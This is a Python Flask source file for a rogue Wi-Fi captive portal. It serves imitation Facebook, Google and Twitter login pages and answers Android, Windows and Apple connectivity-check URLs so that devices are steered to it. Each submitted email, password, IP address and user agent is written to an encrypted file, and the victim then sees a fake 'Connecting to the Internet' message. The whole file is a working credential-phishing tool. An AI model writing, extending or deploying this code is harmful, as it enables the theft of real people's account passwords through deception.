"""
Captive Portal Flask Web Application.

Serves login pages and captures submitted credentials, encrypting them
using a Fernet key loaded from configuration. Also handles common captive
portal detection URLs.
"""
import os
import json
import sys
import logging
from flask import Flask, request, render_template, redirect, url_for, abort
from cryptography.fernet import Fernet, InvalidToken
from datetime import datetime

# --- Constants ---
CONFIG_FILENAME = 'config.json'
LOG_DIR_NAME = 'login_details'
CRED_FILENAME = 'captured_credentials.enc'
TEMPLATE_MAP = {
    'facebook': 'login_facebook.html',
    'google': 'login_google.html',
    'twitter': 'login_twitter.html'
}
# --- ---

def create_app():
    """Creates and configures the Flask application instance."""
    app = Flask(__name__)
    app.logger.setLevel(logging.INFO) # Set desired logging level

    # --- Configuration Loading ---
    script_dir = os.path.dirname(__file__)
    config_path = os.path.join(script_dir, '..', CONFIG_FILENAME)
    log_dir = os.path.join(script_dir, '..', LOG_DIR_NAME)
    cred_file_path = os.path.join(log_dir, CRED_FILENAME)

    app.logger.info(f"Loading configuration from: {config_path}")
    config = None
    if not os.path.exists(config_path):
        app.logger.critical(f"Configuration file not found: {config_path}")
        sys.exit(1) # Or handle differently, e.g., raise exception
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        app.logger.info("Configuration loaded.")
    except json.JSONDecodeError as e:
        app.logger.critical(f"Error decoding configuration file {config_path}: {e}")
        sys.exit(1)
    except Exception as e:
        app.logger.critical(f"Unexpected error loading configuration: {e}")
        sys.exit(1)

    # --- Fernet Key Setup ---
    app.logger.warning("SECURITY WARNING: Loading Fernet key from config file. This is insecure for production environments.")
    try:
        fernet_key = config['fernet_key'].encode()
        app.config['FERNET'] = Fernet(fernet_key)
        app.logger.info("Fernet instance created.")
    except KeyError:
        app.logger.critical("Configuration file is missing the 'fernet_key'.")
        sys.exit(1)
    except Exception as e:
        app.logger.critical(f"Failed to initialize Fernet instance: {e}")
        sys.exit(1)

    # --- Credential File Setup ---
    app.config['CRED_FILE_PATH'] = cred_file_path
    try:
        os.makedirs(log_dir, exist_ok=True)
        app.logger.info(f"Ensured credential directory exists: {log_dir}")
    except OSError as e:
        app.logger.error(f"Could not create credential directory {log_dir}: {e}")
        # Decide if this is fatal. App might still run but fail on submission.

    return app

app = create_app()

# --- Routes ---

@app.route('/', methods=['GET'])
def index():
    """Displays the provider selection page."""
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    app.logger.info(f"Landing page visit from {client_ip} (User-Agent: {user_agent})")
    # Avoid logging full headers/cookies unless necessary for debugging
    # app.logger.debug(f"Landing page headers: {dict(request.headers)}")
    # app.logger.debug(f"Landing page cookies: {request.cookies}")
    # time.sleep(2) # disabled by default but if you want to simulate loading time you can uncomment this :)
    return render_template('select_provider.html')

@app.route('/login/<provider>', methods=['GET'])
def login_provider(provider):
    """Displays the login page for the selected provider."""
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    provider_lower = provider.lower()

    template = TEMPLATE_MAP.get(provider_lower)
    if not template:
        app.logger.warning(f"Invalid provider '{provider}' requested by {client_ip}")
        abort(404) # Use Flask's abort for standard error pages

    app.logger.info(f"{provider.capitalize()} login page visit from {client_ip} (User-Agent: {user_agent})")
    # time.sleep(2) # <3
    return render_template(template)

@app.route('/submit/<provider>', methods=['POST'])
def submit_provider(provider):
    """Handles submitted credentials, encrypts, and saves them."""
    # Validate provider
    if provider.lower() not in TEMPLATE_MAP:
        app.logger.warning(f"Invalid provider '{provider}' submitted to by {request.remote_addr}")
        abort(404)

    username = request.form.get('email') # Assumes 'email' field for username
    password = request.form.get('pass')  # Assumes 'pass' field for password
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().isoformat()

    # Basic validation
    if not username or not password:
        app.logger.warning(f"Missing username or password from {client_ip} for provider {provider}")
        # Consider returning an error message to the user
        return "<h3>Missing username or password.</h3>", 400

    # Log submission attempt - AVOID LOGGING PASSWORD
    app.logger.info(f"Credential submission attempt from {client_ip} for {provider} (User: {username})")
    # app.logger.debug(f"Raw form data: {request.form}") # Debug only if necessary

    data = {
        'timestamp': timestamp,
        'provider': provider,
        'client_ip': client_ip,
        'username': username,
        'password': password, # Storing raw password before encryption
        'user_agent': user_agent
    }

    try:
        fernet_instance = app.config.get('FERNET')
        if not fernet_instance:
             app.logger.error("Fernet instance not available in app config.")
             return "<h3>Internal server error processing request.</h3>", 500

        encrypted_data = fernet_instance.encrypt(json.dumps(data).encode('utf-8'))
        cred_file_path = app.config.get('CRED_FILE_PATH')

        if not cred_file_path:
             app.logger.error("Credential file path not available in app config.")
             return "<h3>Internal server error processing request.</h3>", 500

        with open(cred_file_path, 'ab') as f:
            f.write(encrypted_data + b'\n')

        # Log success - AVOID LOGGING PASSWORD
        app.logger.info(f"Successfully captured and encrypted credentials from {client_ip} for {provider} (User: {username})")

    except InvalidToken:
         app.logger.error("Fernet encryption failed (Invalid Token/Key?).")
         return "<h3>Internal server error processing request.</h3>", 500
    except OSError as e:
        app.logger.error(f"Error writing to credential file {cred_file_path}: {e}")
        return "<h3>Internal server error processing request.</h3>", 500
    except Exception as e:
        app.logger.error(f"Unexpected error encrypting/saving credentials: {e}")
        return "<h3>Internal server error processing request.</h3>", 500

    # Display a generic success message
    return "<h3>Thank you. Connecting to the Internet...</h3>"

# --- Captive Portal Detection Handling ---
# These routes are commonly hit by devices checking for internet connectivity.
# Redirect them to the main landing page.
@app.route('/generate_204') # Android
@app.route('/gen_204') # Android
@app.route('/connecttest.txt') # Windows
@app.route('/ncsi.txt') # Windows
@app.route('/hotspot-detect.html') # Apple iOS/macOS
@app.route('/library/test/success.html') # Apple macOS
@app.route('/success.txt') # Apple macOS
def handle_captive_portal_check():
    """Redirects captive portal checks to the landing page."""
    client_ip = request.remote_addr
    path = request.path
    app.logger.info(f"Captive portal check from {client_ip} on {path}, redirecting to index.")
    # Use Flask's redirect for cleaner handling
    return redirect(url_for('index'))

# --- Main Execution ---
if __name__ == '__main__':
    # Port 80 requires root/administrator privileges on most systems.
    # Consider using a higher port (e.g., 5000, 8080) for development/testing
    # or using a reverse proxy (like nginx) in a real deployment.
    app.logger.info("Starting Flask development server on host 0.0.0.0, port 80.")
    app.logger.warning("Running on port 80 may require administrator privileges.")
    app.run(host='0.0.0.0', port=80, debug=False) # Set debug=True only for development
